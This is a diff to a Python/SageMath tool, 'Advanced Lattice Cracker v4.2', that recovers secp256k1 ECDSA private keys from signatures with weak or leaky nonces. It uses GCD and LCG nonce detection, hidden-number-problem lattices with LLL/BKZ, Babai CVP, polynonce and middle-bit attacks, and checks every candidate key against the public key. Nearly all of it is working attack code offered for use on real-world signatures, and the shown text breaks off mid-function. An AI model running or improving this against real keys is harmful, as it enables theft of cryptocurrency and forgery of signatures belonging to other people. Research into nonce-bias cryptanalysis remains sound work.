@@ -1,7 +1,7 @@
 """
-ADVANCED LATTICE CRACKER v4.0 — OPTIMIZED FOR 8GB RAM + ALL CORES
+ADVANCED LATTICE CRACKER v4.2 — OPTIMIZED FOR 8GB RAM + ALL CORES
 =================================================================
-15 attacks. Fast. Memory-safe. Multiprocessing. No BKZ block > 20.
+16 attacks. Fast. Memory-safe. Multiprocessing. No BKZ block > 20.
 
 ATTACK ROSTER:
   PHASE 0 (Instant — No Lattice):
@@ -11,25 +11,30 @@ ATTACK ROSTER:
   PHASE 1 (Fast — Tiny Lattice + LLL + Babai CVP):
     3. Babai HNP MSB
     4. Babai HNP LSB
-    5. Monte Carlo Random Sampling
-    6. Stochastic Lattice Annealing (SLA) [NOVEL]
-    7. Signature Filtering + Tiny Lattice
-    8. Dario Clavijo Polynonce (Differential)
+    5. Stochastic Lattice Annealing (SLA) [NOVEL]
+    6. Signature Filtering + Tiny Lattice
+    7. Dario Clavijo Polynonce (Differential)
 
   PHASE 2 (Standard HNP — Medium Lattice):
-    9. Middle-Bit Window Leak
-    10. Linear Nonce Bias
-    11. Shared LSB (Fixed Suffix)
-    12. Sequential Nonce
+    8. Middle-Bit Window Leak
+    9. Linear Nonce Bias (absorbs Sequential Nonce)
+    10. Shared LSB (Fixed Suffix)
 
   PHASE 3 (Deep Reduction):
-    13. Kannan Embedding (CVP→SVP)
-    14. Progressive BKZ MSB/LSB (10→15→20)
-    15. Greedy Round-Off CVP
+    11. Kannan Embedding (CVP→SVP)
+    12. Progressive BKZ MSB/LSB (10→15→20)
+
+  NOVEL ATTACKS (v4.2):
+    13. Minerva Variable-Bitlength HNP [per-sig scaling]
+    14. Z-Correlation Nonce Detection [hash-derived k]
+    15. Generalized Linear Recurrence [LFSR order 2-4]
+    16. Extended Polynonce (k=a*r+b, k=a*z²+b*z+c)
 
 REMOVED:
-  - Multi-Leak Fusion: requires leak_type metadata that real-world
-    signatures never contain. Useless outside test scenarios.
+  - Monte Carlo: strictly dominated by SLA (guided search)
+  - Sequential Nonce: identical math to Linear Bias (merged configs)
+  - Greedy Round-Off: weaker CVP than Babai + duplicate LLL extraction
+  - Multi-Leak Fusion: requires leak_type metadata not present in real data
 """
 
 import json
@@ -37,7 +42,10 @@ import os
 import csv
 import math
 import gc
+import io
 import sys
+import contextlib
+import argparse
 import time
 import random as py_random
 import shutil
@@ -73,6 +81,9 @@ G = E(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
 MAX_SIGS = 100         # Upper limit to allow Babai LLL its required 90+ geometric space
 ATTACK_TIMEOUT = 120   # Max seconds per individual attack
 N_HALF = N >> 1        # N // 2 for low-s normalization
+
+# Runtime flags (set by argparse in main)
+SKIP_GCD = False
 
 # ==============================================================================
 # CORE UTILITIES
@@ -123,14 +134,12 @@ def verify_key(pub_hex, priv_int):
 
 
 def min_sigs_lll(leaked_bits):
-    """Generous geometry bounds required by weak LLL math (Babai)."""
+    """Geometry bounds for LLL-based Babai attacks. Capped at 50 to avoid OOM."""
     if leaked_bits >= 32: return 12
     if leaked_bits >= 16: return 24
     if leaked_bits >= 12: return 40
-    if leaked_bits >= 8: return 68
-    if leaked_bits >= 6: return 90
-    if leaked_bits >= 4: return 140
-    return 160
+    if leaked_bits >= 8: return 50
+    return 200  # Below 8-bit leak: Babai is ineffective, skip
 
 def min_sigs_bkz(leaked_bits):
     """Tight, strict bounds solely for BKZ block reduction to preserve speed."""
@@ -173,8 +182,7 @@ def precompute_uv(sigs):
     uv = []
     for s in sigs:
         if 'A' in s and 'B' in s:
-            # A = z*s_inv, B = r*s_inv  (pre-computed by analyzer)
-            uv.append((int(s['B'], 16), int(s['A'], 16)))
+            uv.append((int(s['A'], 16), int(s['B'], 16)))
         else:
             r = int(s['r'], 16)
             si = int(s['s'], 16)
@@ -184,6 +192,46 @@ def precompute_uv(sigs):
     return uv
 
 
+def precompute_sig_data(sigs):
+    """Precompute (r, s, z, s_inv, t=r*s_inv, a=z*s_inv) once for all attacks.
+    Avoids redundant inverse_mod calls across 12 attacks."""
+    data = []
+    for sig in sigs:
+        r = int(sig['r'], 16)
+        s = int(sig['s'], 16)
+        z = int(sig['z'], 16)
+        s_inv = int(inverse_mod(s, N))
+        t = (r * s_inv) % N
+        a = (z * s_inv) % N
+        data.append({'r': r, 's': s, 'z': z, 's_inv': s_inv, 't': t, 'a': a})
+    return data
+
+
+_pub_point_cache = {}
+def verify_key_fast(pub_hex, priv_int):
+    """Cached-pubpoint verify_key — avoids re-parsing pub each call."""
+    priv_int = int(priv_int)
+    if priv_int <= 0 or priv_int >= N:
+        return False
+    try:
+        if pub_hex not in _pub_point_cache:
+            if pub_hex.startswith('04') and len(pub_hex) == 130:
+                xp = int(pub_hex[2:66], 16)
+                yp = int(pub_hex[66:], 16)
+                _pub_point_cache[pub_hex] = E(Fp(xp), Fp(yp))
+            else:
+                xp = int(pub_hex[2:], 16)
+                y_even = pub_hex[:2] == '02'
+                ys = E.lift_x(Fp(xp))
+                if (int(ys[1]) % 2 == 0) != y_even:
+                    ys = E(Fp(xp), Fp(-int(ys[1])))
+                _pub_point_cache[pub_hex] = ys
+        pt = priv_int * G
+        return pt == _pub_point_cache[pub_hex]
+    except Exception:
+        return False
+
+
 def exact_div(n, d):
     """Infinitely precise Python integer division truncating towards zero."""
     n, d = int(n), int(d)
@@ -191,27 +239,45 @@ def exact_div(n, d):
 
 def extract_key(M_r, key_col, scale, pub):
     for row in M_r:
-        val = row[key_col]
+        val = int(row[key_col])
         if val == 0:
             continue
         for sign in [1, -1]:
-            cand = (sign * exact_div(val, scale)) % N
-            if cand != 0 and verify_key(pub, cand):
+            cand = (sign * (val // scale)) % N
+            if cand != 0 and verify_key_fast(pub, cand):
                 return cand
+        try:
+            scale_inv = int(inverse_mod(int(scale) % N, N))
+            for sign in [1, -1]:
+                cand = (sign * val * scale_inv) % N
+                if cand != 0 and verify_key_fast(pub, cand):
+                    return cand
+        except Exception:
+            pass
     return None
 
 
-def extract_key_extended(M_r, key_col, scale, pub, search_range=30):
+def extract_key_extended(M_r, key_col, scale, pub, search_range=5):
     for row in M_r:
-        val = row[key_col]
+        val = int(row[key_col])
         if val == 0:
             continue
-        base = exact_div(val, scale)
+        base = val // scale
         for offset in range(-search_range, search_range + 1):
             for sign in [1, -1]:
                 cand = (sign * (base + offset)) % N
-                if cand != 0 and verify_key(pub, cand):
+                if cand != 0 and verify_key_fast(pub, cand):
                     return cand
+        try:
+            scale_inv = int(inverse_mod(int(scale) % N, N))
+            mod_base = (val * scale_inv) % N
+            for offset in range(-search_range, search_range + 1):
+                for sign in [1, -1]:
+                    cand = (sign * (mod_base + offset)) % N
+                    if cand != 0 and verify_key_fast(pub, cand):
+                        return cand
+        except Exception:
+            pass
     return None
 
 
@@ -229,57 +295,63 @@ def _timeout_handler():
 # LATTICE BUILDERS
 # ==============================================================================
 def build_msb_lattice(sigs, leaked_bits):
+    """Standard HNP lattice for MSB leak.
+    Correctly scales t_i, a_i columns by W to embed the HNP optimally."""
     num = min(len(sigs), MAX_SIGS)
     sigs = sigs[:num]
-    B = 2 ** (256 - leaked_bits)
+    W = 2 ** leaked_bits
     dim = num + 2
     M = Matrix(ZZ, dim, dim)
+    mu = N // (2 * W)
     for i in range(num):
         r_i = int(sigs[i]['r'], 16)
         s_i = int(sigs[i]['s'], 16)
         z_i = int(sigs[i]['z'], 16)
         s_inv = int(inverse_mod(s_i, N))
         t_i = (r_i * s_inv) % N
-        a_i = (z_i * s_inv - B // 2) % N
-        M[i, i] = N * N
-        M[num, i] = t_i * N
-        M[num + 1, i] = a_i * N
-    M[num, num] = B
-    M[num + 1, num + 1] = B * N
-    return M, B, num
+        a_i = (z_i * s_inv) % N
+        M[i, i] = N * W
+        M[num, i] = t_i * W
+        M[num + 1, i] = (a_i - mu) * W
+    M[num, num] = 1
+    M[num + 1, num + 1] = N
+    return M, 1, num
 
 
 def build_lsb_lattice(sigs, leaked_bits):
+    """Standard HNP lattice for LSB leak.
+    Shifts out known low bits, then same structure as MSB."""
     num = min(len(sigs), MAX_SIGS)
     sigs = sigs[:num]
     shift = 2 ** leaked_bits
-    B = 2 ** (256 - leaked_bits)
+    W = 2 ** leaked_bits
     shift_inv = int(inverse_mod(shift, N))
     dim = num + 2
     M = Matrix(ZZ, dim, dim)
+    mu = N // (2 * W)
     for i in range(num):
         r_i = int(sigs[i]['r'], 16)
         s_i = int(sigs[i]['s'], 16)
         z_i = int(sigs[i]['z'], 16)
         s_inv = int(inverse_mod(s_i, N))
         t_i = (shift_inv * r_i * s_inv) % N
-        a_i = (shift_inv * z_i * s_inv - B // 2) % N
-        M[i, i] = N * N
-        M[num, i] = t_i * N
-        M[num + 1, i] = a_i * N
-    M[num, num] = B
-    M[num + 1, num + 1] = B * N
-    return M, B, num
+        a_i = (shift_inv * z_i * s_inv) % N
+        M[i, i] = N * W
+        M[num, i] = t_i * W
+        M[num + 1, i] = (a_i - mu) * W
+    M[num, num] = 1
+    M[num + 1, num + 1] = N
+    return M, 1, num
 
 
 # ==============================================================================
 # REDUCTION METHODS
 # ==============================================================================
-def progressive_reduce(M, max_block=30):
-    """Progressive BKZ: LLL → BKZ-15 → BKZ-20 → BKZ-25 → BKZ-30."""
+def progressive_reduce(M, max_block=20):
+    """Progressive BKZ: LLL → BKZ-10 → BKZ-15 → BKZ-20. Capped at 20 for speed."""
     M_r = M.LLL()
     nrows = M.nrows()
-    for bs in [15, 20, 25, 30, min(max_block, nrows)]:
+    for bs in sorted(set([10, 15, min(max_block, nrows)])):
         if bs > nrows or bs < 2:
             continue
         try:
@@ -293,33 +365,46 @@ def progressive_reduce(M, max_block=30):
 # BABAI'S NEAREST PLANE (CVP SOLVER)
 # ==============================================================================
 def babai_cvp(lattice_basis, target_vector):
-    """Babai's Nearest Plane CVP using original exact QQ field.
-    Prevents floating-point precision loss and avoids SageMath inexact ring limitations."""
-    B = Matrix(QQ, lattice_basis)
-    G_mat, _ = B.gram_schmidt()
+    """Babai's Nearest Plane CVP using RealField(512).
+    512-bit precision is 2x curve size — sufficient while being 4x faster than 1024."""
+    RF = RealField(512)
+    B = Matrix(RF, lattice_basis)
     n = B.nrows()
-    b = vector(QQ, target_vector)
+    
+    # Manual Gram-Schmidt orthogonalization
+    G = []
+    G_norms = []
+    for i in range(n):
+        g_i = B[i]
+        for j in range(i):
+            denom = G_norms[j]
+            if denom > RF(1e-100):
+                mu_ij = B[i].dot_product(G[j]) / denom
+                g_i = g_i - mu_ij * G[j]
+        G.append(g_i)
+        G_norms.append(g_i.dot_product(g_i))
+
+    b = vector(RF, target_vector)
     for i in range(n - 1, -1, -1):
-        gi = G_mat[i]
-        denom = gi.dot_product(gi)
-        if denom == 0:
+        denom = G_norms[i]
+        if denom < RF(1e-100):
             continue
-        ci = round(b.dot_product(gi) / denom)
-        b -= ci * B[i]
-    closest = vector(ZZ, target_vector) - vector(ZZ, [round(x) for x in b])
+        ci = round(b.dot_product(G[i]) / denom)
+        b -= RF(ci) * B[i]
+    closest = vector(ZZ, target_vector) - vector(ZZ, [ZZ(round(x)) for x in b])
     return closest
 
 
 # ██████████████████████████████████████████████████████████████████████████████
 # ATTACK 1: GCD SMALL-DELTA NONCE DETECTION
 # ██████████████████████████████████████████████████████████████████████████████
-def solve_gcd_nonce(pub, sigs, max_delta=500, precomputed_uv=None):
+def solve_gcd_nonce(pub, sigs, max_delta=100, precomputed_uv=None):
     n = len(sigs)
     if n < 2:
         return None
     uv = precomputed_uv if precomputed_uv is not None else precompute_uv(sigs)
-    for i in range(min(n, 40)):
-        for j in range(i + 1, min(i + 6, n)):
+    for i in range(min(n, 30)):
+        for j in range(i + 1, min(i + 5, n)):
             du = (uv[j][0] - uv[i][0]) % N
             dv = (uv[j][1] - uv[i][1]) % N
             if du == 0:
@@ -329,10 +414,9 @@ def solve_gcd_nonce(pub, sigs, max_delta=500, precomputed_uv=None):
                 d_cand = int(((delta - dv) * du_inv) % N)
                 if d_cand == 0 or d_cand >= N:
                     continue
-                # FIX: Require at least 2/5 third-party sigs to be consistent
                 consistent_count = 0
                 check_count = 0
-                for m in range(min(n, 20)):
+                for m in range(min(n, 15)):
                     if m == i or m == j:
                         continue
                     diff_m = (d_cand * (uv[m][0] - uv[i][0]) + (uv[m][1] - uv[i][1])) % N
@@ -341,11 +425,11 @@ def solve_gcd_nonce(pub, sigs, max_delta=500, precomputed_uv=None):
                     check_count += 1
                     if diff_m < max_delta * 10:
                         consistent_count += 1
-                    if check_count >= 5:
+                    if check_count >= 4:
                         break
                 if consistent_count < 2:
                     continue
-                if verify_key(pub, d_cand):
+                if verify_key_fast(pub, d_cand):
                     return d_cand
     return None
 
@@ -376,7 +460,7 @@ def solve_lcg_phantom(pub, sigs, precomputed_uv=None):
                 d_cand = int((-C_c * inverse_mod(int(B_c), N)) % N)
             except Exception:
                 continue
-            if d_cand != 0 and verify_key(pub, d_cand):
+            if d_cand != 0 and verify_key_fast(pub, d_cand):
                 return d_cand
             continue
         disc = (B_c * B_c - 4 * A_c * C_c) % N
@@ -384,7 +468,6 @@ def solve_lcg_phantom(pub, sigs, precomputed_uv=None):
             sqrt_disc = int(Mod(disc, N).sqrt())
         except Exception:
             continue
-        # FIX: Guard against (2*A_c) % N == 0
         two_A = (2 * A_c) % N
         if two_A == 0:
             continue
@@ -394,7 +477,7 @@ def solve_lcg_phantom(pub, sigs, precomputed_uv=None):
             continue
         for sign in [1, -1]:
             d_cand = int(((-B_c + sign * sqrt_disc) * inv_2A) % N)
-            if d_cand != 0 and verify_key(pub, d_cand):
+            if d_cand != 0 and verify_key_fast(pub, d_cand):
                 return d_cand
     return None
 
@@ -402,88 +485,172 @@ def solve_lcg_phantom(pub, sigs, precomputed_uv=None):
 # ██████████████████████████████████████████████████████████████████████████████
 # ATTACK 3 & 4: BABAI HNP (MSB + LSB)
 # ██████████████████████████████████████████████████████████████████████████████
-def solve_babai_msb(pub, sigs, leaked_bits):
+def solve_babai_msb(pub, sigs, leaked_bits, sig_data=None):
     sigs = sigs[:MAX_SIGS]
-    # PRIMARY: Proven N*N lattice construction + standard LLL extraction
     M, B_scale, key_col = build_msb_lattice(sigs, leaked_bits)
     M_r = M.LLL()
     d = extract_key(M_r, key_col, B_scale, pub)
     if d:
         return d
-    del M, M_r  # Free first lattice before building second
-    # BONUS: Babai CVP on simple lattice
+    d = extract_key_extended(M_r, key_col, B_scale, pub)
+    if d:
+        return d
+    del M, M_r
+    # Babai CVP (skip if num > 30 — Gram-Schmidt is O(n³))
     num = len(sigs)
+    if num > 30:
+        return None
+    W = 2 ** leaked_bits
     dim = num + 1
     L = Matrix(ZZ, dim, dim)
     t_vals = []
     a_vals = []
+    sd = sig_data[:num] if sig_data and len(sig_data) >= num else None
     for i in range(num):
-        r_i = int(sigs[i]['r'], 16)
-        s_i = int(sigs[i]['s'], 16)
-        z_i = int(sigs[i]['z'], 16)
-        s_inv = int(inverse_mod(s_i, N))
-        t_vals.append((r_i * s_inv) % N)
-        a_vals.append((z_i * s_inv) % N)
-        L[i, i] = N * N
+        if sd:
+            t_vals.append(sd[i]['t'])
+            a_vals.append(sd[i]['a'])
+        else:
+            r_i = int(sigs[i]['r'], 16)
+            s_i = int(sigs[i]['s'], 16)
+            z_i = int(sigs[i]['z'], 16)
+            s_inv = int(inverse_mod(s_i, N))
+            t_vals.append((r_i * s_inv) % N)
+            a_vals.append((z_i * s_inv) % N)
+        L[i, i] = N
     for i in range(num):
-        L[num, i] = t_vals[i] * N
-    B = 2 ** (256 - leaked_bits)
-    L[num, num] = B
+        L[num, i] = t_vals[i]
+    L[num, num] = W
     L_r = L.LLL()
-    target = vector(ZZ, [int(B // 2 - a) * N for a in a_vals] + [0])
+    target = vector(ZZ, [(-a_vals[i]) % N for i in range(num)] + [0])
     closest = babai_cvp(L_r, target)
-    d_cand = exact_div(closest[num], B) % N
-    if d_cand != 0 and verify_key(pub, d_cand):
+    d_cand = exact_div(closest[num], W) % N
+    if d_cand != 0 and verify_key_fast(pub, d_cand):
         return d_cand
     d_cand = (-d_cand) % N
-    if d_cand != 0 and verify_key(pub, d_cand):
+    if d_cand != 0 and verify_key_fast(pub, d_cand):
         return d_cand
     return None
 
 
-def solve_babai_lsb(pub, sigs, leaked_bits):
+def solve_babai_lsb(pub, sigs, leaked_bits, sig_data=None):
     sigs = sigs[:MAX_SIGS]
-    # PRIMARY: Proven N*N lattice construction + standard LLL extraction
     M, B_scale, key_col = build_lsb_lattice(sigs, leaked_bits)
     M_r = M.LLL()
     d = extract_key(M_r, key_col, B_scale, pub)
     if d:
         return d
-    del M, M_r  # Free first lattice before building second
-    # BONUS: Babai CVP on simple lattice
+    d = extract_key_extended(M_r, key_col, B_scale, pub)
+    if d:
+        return d
+    del M, M_r
+    # Babai CVP (skip if num > 30)
     num = len(sigs)
+    if num > 30:
+        return None
+    W = 2 ** leaked_bits
     shift = 2 ** leaked_bits
     shift_inv = int(inverse_mod(shift, N))
     dim = num + 1
     L = Matrix(ZZ, dim, dim)
     t_vals = []
     a_vals = []
+    sd = sig_data[:num] if sig_data and len(sig_data) >= num else None
     for i in range(num):
-        r_i = int(sigs[i]['r'], 16)
-        s_i = int(sigs[i]['s'], 16)
-        z_i = int(sigs[i]['z'], 16)
-        s_inv = int(inverse_mod(s_i, N))
-        t_vals.append((shift_inv * r_i * s_inv) % N)
-        a_vals.append((shift_inv * z_i * s_inv) % N)
-        L[i, i] = N * N
+        if sd:
+            t_vals.append((shift_inv * sd[i]['t']) % N)
+            a_vals.append((shift_inv * sd[i]['a']) % N)
+        else:
+            r_i = int(sigs[i]['r'], 16)
+            s_i = int(sigs[i]['s'], 16)
+            z_i = int(sigs[i]['z'], 16)
+            s_inv = int(inverse_mod(s_i, N))
+            t_vals.append((shift_inv * r_i * s_inv) % N)
+            a_vals.append((shift_inv * z_i * s_inv) % N)
+        L[i, i] = N
     for i in range(num):
-        L[num, i] = t_vals[i] * N
-    B = 2 ** (256 - leaked_bits)
-    L[num, num] = B
+        L[num, i] = t_vals[i]
+    L[num, num] = W
     L_r = L.LLL()
-    target = vector(ZZ, [int(B // 2 - a) * N for a in a_vals] + [0])
+    target = vector(ZZ, [(-a_vals[i]) % N for i in range(num)] + [0])
     closest = babai_cvp(L_r, target)
-    d_cand = exact_div(closest[num], B) % N
-    if d_cand != 0 and verify_key(pub, d_cand):
+    d_cand = exact_div(closest[num], W) % N
+    if d_cand != 0 and verify_key_fast(pub, d_cand):
         return d_cand
     d_cand = (-d_cand) % N
-    if d_cand != 0 and verify_key(pub, d_cand):
+    if d_cand != 0 and verify_key_fast(pub, d_cand):
         return d_cand
     return None
 
 
 # ██████████████████████████████████████████████████████████████████████████████
-# ATTACK 8: DARIO CLAVIJO DIFFERENTIAL POLYNONCE
+# ATTACK 8a: ALGEBRAIC POLYNONCE (k = a*z + b, direct solve)
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_polynonce_algebraic(pub, sigs):
+    """Direct algebraic solve for linear polynonce: k_i = a*z_i + b (mod N).
+    Uses 3 signatures to eliminate a and b, solving for d directly.
+    Tries all consecutive triples and also spread-out triples."""
+    n = len(sigs)
+    if n < 3:
+        return None
+    parsed = []
+    for s in sigs:
+        parsed.append((int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)))
+
+    def try_triple(i, j, k):
+        r0, s0, z0 = parsed[i]
+        r1, s1, z1 = parsed[j]
+        r2, s2, z2 = parsed[k]
+        A01 = ((s0 * z0) * r1 - (s1 * z1) * r0) % N
+        B01 = (s0 * r1 - s1 * r0) % N
+        C01 = (z0 * r1 - z1 * r0) % N
+        A02 = ((s0 * z0) * r2 - (s2 * z2) * r0) % N
+        B02 = (s0 * r2 - s2 * r0) % N
+        C02 = (z0 * r2 - z2 * r0) % N
+        det = (A01 * B02 - A02 * B01) % N
+        if det == 0:
+            return None
+        try:
+            det_inv = int(inverse_mod(int(det), N))
+        except Exception:
+            return None
+        a_val = ((C01 * B02 - C02 * B01) * det_inv) % N
+        if B01 == 0:
+            if B02 == 0:
+                return None
+            b_val = ((C02 - a_val * A02) * int(inverse_mod(int(B02), N))) % N
+        else:
+            b_val = ((C01 - a_val * A01) * int(inverse_mod(int(B01), N))) % N
+        try:
+            r0_inv = int(inverse_mod(r0, N))
+        except Exception:
+            return None
+        d_cand = (((a_val * s0) * z0 + b_val * s0 - z0) * r0_inv) % N
+        if d_cand != 0 and verify_key_fast(pub, d_cand):
+            return d_cand
+        return None
+
+    # Try consecutive triples
+    for i in range(min(n - 2, 60)):
+        d = try_triple(i, i + 1, i + 2)
+        if d:
+            return d
+    # Try limited spread-out triples (max ~200 attempts vs original 24000)
+    spread_attempts = 0
+    for i in range(min(n, 10)):
+        for j in range(i + 3, min(n, 20)):
+            for k in range(j + 3, min(n, 30)):
+                d = try_triple(i, j, k)
+                if d:
+                    return d
+                spread_attempts += 1
+                if spread_attempts >= 200:
+                    return None
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 8b: DARIO CLAVIJO DIFFERENTIAL POLYNONCE (LATTICE)
 # ██████████████████████████████████████████████████████████████████████████████
 def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
     sigs = sigs[:MAX_SIGS]
@@ -495,16 +662,16 @@ def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
     mnsn_inv = (msgn * int(inverse_mod(sn, N))) % N
     matrix = Matrix(ZZ, m + 2, m + 2)
     for i in range(m):
-        matrix[i, i] = N * N
+        matrix[i, i] = N
     for i in range(m):
         si_inv = int(inverse_mod(sig_pairs[i][1], N))
         x0 = ((sig_pairs[i][0] * si_inv) - rnsn_inv) % N
         x1 = ((msgs[i] * si_inv) - mnsn_inv) % N
-        matrix[m, i] = x0 * N
-        matrix[m + 1, i] = x1 * N
+        matrix[m, i] = x0
+        matrix[m + 1, i] = x1
     B_val = int(2**B_bits)
     matrix[m, m] = B_val
-    matrix[m + 1, m + 1] = B_val * N
+    matrix[m + 1, m + 1] = N
     if use_bkz:
         new_matrix = matrix.LLL()
         new_matrix = new_matrix.BKZ(block_size=min(20, m))
@@ -515,17 +682,17 @@ def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
         if val == 0:
             continue
         possible_d = exact_div(val, B_val) % N
-        if possible_d != 0 and verify_key(pub, possible_d):
+        if possible_d != 0 and verify_key_fast(pub, possible_d):
             return possible_d
         neg_d = (-possible_d) % N
-        if neg_d != 0 and verify_key(pub, neg_d):
+        if neg_d != 0 and verify_key_fast(pub, neg_d):
             return neg_d
         # FIX: differential extraction with proper modular arithmetic
         diff_val = row[0]
         if diff_val == 0:
             continue
         for sign_v in (1, -1):
-            potential_nonce_diff = sign_v * exact_div(diff_val, N)
+            potential_nonce_diff = sign_v * int(diff_val)
             # numerator = s_n * z_0 - s_0 * z_n - s_0 * s_n * nonce_diff
             numerator = ((sn * msgs[0]) % N - (sig_pairs[0][1] * msgn) % N
                          - (sig_pairs[0][1] * sn % N * potential_nonce_diff) % N) % N
@@ -536,47 +703,20 @@ def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
             try:
                 denom_inv = int(inverse_mod(int(denominator), N))
                 key = (numerator * denom_inv) % N
-                if key != 0 and verify_key(pub, key):
+                if key != 0 and verify_key_fast(pub, key):
                     return key
             except Exception:
                 pass
     return None
 
 
-# ██████████████████████████████████████████████████████████████████████████████
-# ATTACK 5: MONTE CARLO RANDOM SAMPLING
-# ██████████████████████████████████████████████████████████████████████████████
-def solve_monte_carlo(pub, sigs, leaked_bits, num_trials=80, sample_size=15, time_budget=30):
-    """Monte Carlo with time budget — stops early if time_budget seconds exceeded."""
-    if len(sigs) < sample_size:
-        sample_size = len(sigs)
-    t0 = time.time()
-    for trial in range(num_trials):
-        if time.time() - t0 > time_budget:
-            break
-        subset = py_random.sample(sigs, sample_size)
-        M, B, key_col = build_msb_lattice(subset, leaked_bits)
-        M_r = M.LLL()
-        d = extract_key(M_r, key_col, B, pub)
-        if d:
-            return d
-    for trial in range(num_trials // 2):
-        if time.time() - t0 > time_budget:
-            break
-        subset = py_random.sample(sigs, sample_size)
-        M, B, key_col = build_lsb_lattice(subset, leaked_bits)
-        M_r = M.LLL()
-        d = extract_key(M_r, key_col, B, pub)
-        if d:
-            return d
-    return None
-
 
 # ██████████████████████████████████████████████████████████████████████████████
 # ATTACK 6: STOCHASTIC LATTICE ANNEALING (SLA) [NOVEL]
 # ██████████████████████████████████████████████████████████████████████████████
 def solve_sla(pub, sigs, leaked_bits, iterations=60, sample_size=15, time_budget=30):
-    """SLA with time budget — stops early if time_budget seconds exceeded."""
+    """SLA with time budget. Only builds MSB lattice per iteration to halve LLL calls.
+    Tries LSB only on final best indices."""
     n = len(sigs)
     if n < sample_size:
         sample_size = n
@@ -584,6 +724,7 @@ def solve_sla(pub, sigs, leaked_bits, iterations=60, sample_size=15, time_budget
     cooling = 0.97
     indices = py_random.sample(range(n), sample_size)
     best_score = float('inf')
+    current_score = float('inf')
     best_indices = indices[:]
     t0 = time.time()
 
@@ -591,27 +732,17 @@ def solve_sla(pub, sigs, leaked_bits, iterations=60, sample_size=15, time_budget
         if time.time() - t0 > time_budget:
             break
         subset = [sigs[i] for i in indices]
-        # Evaluate both MSB and LSB structures in tandem
+        # Only MSB per iteration (LSB at the end on best)
         M_msb, B, key_col = build_msb_lattice(subset, leaked_bits)
-        M_lsb, _, _ = build_lsb_lattice(subset, leaked_bits)
         M_msb_r = M_msb.LLL()
-        M_lsb_r = M_lsb.LLL()
         d1 = extract_key(M_msb_r, key_col, B, pub)
         if d1: return d1
-        d2 = extract_key(M_lsb_r, key_col, B, pub)
-        if d2: return d2
 
-        # Score the lattice by the length of its shortest vector containing the key
-        score_msb = score_lsb = float('inf')
+        score = float('inf')
         for row in M_msb_r:
             if row[key_col] != 0:
-                score_msb = float(row.norm())
+                score = float(row.norm())
                 break
-        for row in M_lsb_r:
-            if row[key_col] != 0:
-                score_lsb = float(row.norm())
-                break
-        score = min(score_msb, score_lsb)
         if score < best_score:
             best_score = score
             best_indices = indices[:]
@@ -629,18 +760,20 @@ def solve_sla(pub, sigs, leaked_bits, iterations=60, sample_size=15, time_budget
             available.remove(new_idx)
             available.append(old_idx)
             new_indices[pos] = new_idx
-        if score <= best_score or py_random.random() < math.exp(-1.0 / (temperature + 1e-10)):
+        delta = score - current_score
+        if delta <= 0 or py_random.random() < math.exp(-delta / (temperature + 1e-10)):
             indices = new_indices
+            current_score = score
         temperature *= cooling
 
-    # Final attempt on best
+    # Final attempt on best — try both MSB and LSB
     subset = [sigs[i] for i in best_indices]
     M, B, key_col = build_msb_lattice(subset, leaked_bits)
     M_r = M.LLL()
     d = extract_key(M_r, key_col, B, pub)
     if d:
         return d
-    del M, M_r  # Free first lattice before building second
+    del M, M_r
     M, B, key_col = build_lsb_lattice(subset, leaked_bits)
     M_r = M.LLL()
     return extract_key(M_r, key_col, B, pub)
@@ -697,40 +830,89 @@ def solve_filtered_lattice(pub, sigs, leaked_bits):
 # ATTACK 9: MIDDLE-BIT WINDOW LEAK
 # ██████████████████████████████████████████████████████████████████████████████
 def solve_middle_bits(pub, sigs, window_bits, start_bit, progressive=False):
-    num = min(len(sigs), 40)  # Capped at 40 since bivariate lattice doubles dimension to ~82
+    num = min(len(sigs), 30) # 30 is enough and fast for w=16
     sigs = sigs[:num]
-    L_val = 2 ** start_bit
-    H_val = 2 ** (256 - start_bit - window_bits)
-    S_val = 2 ** (start_bit + window_bits)
-    dim = 2 * num + 2
+    dim = 2 * num + 1
     M = Matrix(ZZ, dim, dim)
-    W_v = N * H_val
-    W_high = L_val * N
-    W_x = L_val * H_val
-    W_c = L_val * N * H_val
+    
+    S_L = 2 ** max(0, 255 - start_bit - window_bits)
+    S_H = 2 ** max(0, start_bit - 1)
+    
+    mu_L = 2 ** (start_bit - 1)
+    mu_H = 2 ** (255 - start_bit - window_bits)
+    shift_H = 2 ** (start_bit + window_bits)
+    
+    W_1 = S_L * (2 ** window_bits)
+    
+    T = []
+    A = []
     for i in range(num):
         r_i = int(sigs[i]['r'], 16)
         s_i = int(sigs[i]['s'], 16)
         z_i = int(sigs[i]['z'], 16)
         s_inv = int(inverse_mod(s_i, N))
-        t_i = (r_i * s_inv) % N
-        a_i = (z_i * s_inv) % N
-        M[i, i] = N * W_v
-        M[num + i, i] = (-S_val % N) * W_v
-        M[num + i, num + i] = W_high
-        M[2 * num, i] = t_i * W_v
-        M[2 * num + 1, i] = ((a_i - L_val // 2) % N) * W_v
-    M[2 * num, 2 * num] = W_x
-    M[2 * num + 1, 2 * num + 1] = W_c
+        T.append((r_i * s_inv) % N)
+        A.append((z_i * s_inv) % N)
+        
+    T0_inv = int(inverse_mod(T[0], N))
+    U = [(T[i] * T0_inv) % N for i in range(num)]
+    
+    C = [(A[i] - mu_L - mu_H * shift_H) % N for i in range(num)]
+    K = [(C[i] - U[i] * C[0]) % N for i in range(num)]
+    
+    # 1. N-reduction rows
+    for i in range(num - 1):
+        M[i, i] = N * S_L
+        
+    # 2. Row for \Delta L_0
+    row_L0 = num - 1
+    for i in range(num - 1):
+        M[row_L0, i] = (U[i+1] * S_L) % (N * S_L)
+    M[row_L0, num - 1] = 1 * S_L
+    
+    # 3. Rows for \Delta H_i
+    for i in range(num - 1):
+        row_Hi = num + i
+        val = (-shift_H) % N
+        M[row_Hi, i] = (val * S_L) % (N * S_L)
+        M[row_Hi, num + i] = 1 * S_H
+        
+    # 4. Row for \Delta H_0
+    row_H0 = 2 * num - 1
+    for i in range(num - 1):
+        val = (U[i+1] * shift_H) % N
+        M[row_H0, i] = (val * S_L) % (N * S_L)
+    M[row_H0, 2 * num - 1] = 1 * S_H
+    
+    # 5. Row for Constant
